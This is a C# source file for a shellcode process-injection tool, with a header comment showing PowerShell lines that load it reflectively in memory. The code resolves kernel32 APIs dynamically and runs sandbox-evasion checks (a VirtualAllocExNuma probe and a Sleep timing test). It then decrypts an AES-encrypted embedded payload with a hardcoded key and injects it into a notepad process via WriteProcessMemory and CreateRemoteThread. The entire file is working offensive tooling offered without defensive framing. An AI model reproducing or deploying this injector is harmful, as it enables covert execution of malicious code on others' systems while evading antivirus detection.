/*
$dll = "C:\...\DLLReflectiveDLLInjection.dll"
$bytes = [System.IO.File]::ReadAllBytes($dll)
[System.Reflection.Assembly]::Load($bytes)
[DLLReflectiveDLLInjection.Main]::run()
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace DLLReflectiveDLLInjection
{
    public class Main
    {
        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        public static void run()
        {
            var pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            var dVirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocExNuma)) as DynamicInvoke.VirtualAllocExNuma;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            var dGetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.GetCurrentProcess)) as DynamicInvoke.GetCurrentProcess;
            IntPtr mem = dVirtualAllocExNuma(dGetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "Sleep");
            var dSleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.Sleep)) as DynamicInvoke.Sleep;
            dSleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            Process[] targetProcess = Process.GetProcessesByName("notepad");

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var dOpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.OpenProcess)) as DynamicInvoke.OpenProcess;
            IntPtr hProcess = dOpenProcess(0x001F0FFF, false, targetProcess[0].Id);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            var dVirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocEx)) as DynamicInvoke.VirtualAllocEx;
            IntPtr addr = dVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            string finalPayload = "AslaU5xFiIohDIlw0kEr/Aqy26mxRIF1xGDEBov4SbTe4VhoqRRi0MZVHOqjDe1GnHwYnveUcdAJFJZnEgfUpHSAr2okPHLdpzwcokHz/ZtTN7FWGqpr/8qC5KowK+1fVCO+MoE5cpiYj664IaVrQDJPdrdRMWR5dM7vPRWzLez5B601OsD7Y5jUKOqkcmo1qF9TJTedHNayh76pCc7TUkAzLXt+wJZp4nlZ7MWBpd1PtzttZOxhW7e3wN1NpakCHmDCVmAN90EN6DyQGZT7jhrjDw/rosqlrjUgXMGZNHJj90jbKMRKlYnquRHPv5lr3ANdWYpSasLaCUQmyEiFVV6B5EMT77Sg2T5b99z3gbIQ2s7vwYvXjbPS7VoAoB7uwrDTbFub9inpjTLgUOIDDHa/EIEoXKn1WN1HMDw28XRmbRmB3Gq13uavTydvt9nSAZ6kYjsmGSN7+Me/oO3sM8Hog4erYKP99myB9tZ9oU3s9sICR/kjQsq4yceM6bVJ6QQsgMKuhncKNGBlUc4N7IONO2/tw7KZ3ntHcTV5odBJJsU8VAXgbSaBrCjgPSoiC2JyJjwyWfh9sRjwfy53x21vuTSxwsRXAssGINqcDbaf7bgTNAatTgCNemYjX+rV1KgGWANICokz5gzaEzyHj2m0BpkheBnv5+B1gsODka4K1xkRbS3k2MIySmq6w+VkA2nXEZlbjBexXyna/3UdVIFzI3jLPG+4Yt+nBJ5whOo4xjuLfozBrwMRTztON9kV6DsAmQwenm4OWM8zI5IAP/qRL+G5bf1X7LdEthiIG6QZ9DHx7qnF3NSaw0/dld8yeaROfbfQOmrhqmozYnpdEZmdkoyLu2Nn4fL/N1GMa1+g5N7zP2jzmCSkPcmO7nOIJtiIHHS5MrW3dd3ezGhkYW8nlIn59l1gy0CdpKNkaGE=";
            byte[] key = new byte[32] { 0x6e, 0xf3, 0x09, 0x80, 0xdf, 0xa4, 0x64, 0xc7, 0xd8, 0xa0, 0xb4, 0x29, 0x4b, 0x25, 0x0b, 0x94, 0x7e, 0xde, 0xe0, 0xe4, 0x7c, 0x20, 0x3a, 0x2a, 0xea, 0xa3, 0xa2, 0x24, 0x94, 0x74, 0x66, 0xd4 };
            byte[] iv = new byte[16] { 0x42, 0xe7, 0x39, 0x57, 0x35, 0x79, 0x5f, 0x8f, 0xc2, 0x49, 0xe6, 0x05, 0xb8, 0x99, 0x32, 0xf8 };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            IntPtr outSize;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var dWriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.WriteProcessMemory)) as DynamicInvoke.WriteProcessMemory;
            dWriteProcessMemory(hProcess, addr, decrypted_data, decrypted_data.Length, out outSize);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            var dCreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CreateRemoteThread)) as DynamicInvoke.CreateRemoteThread;
            IntPtr hThread = dCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}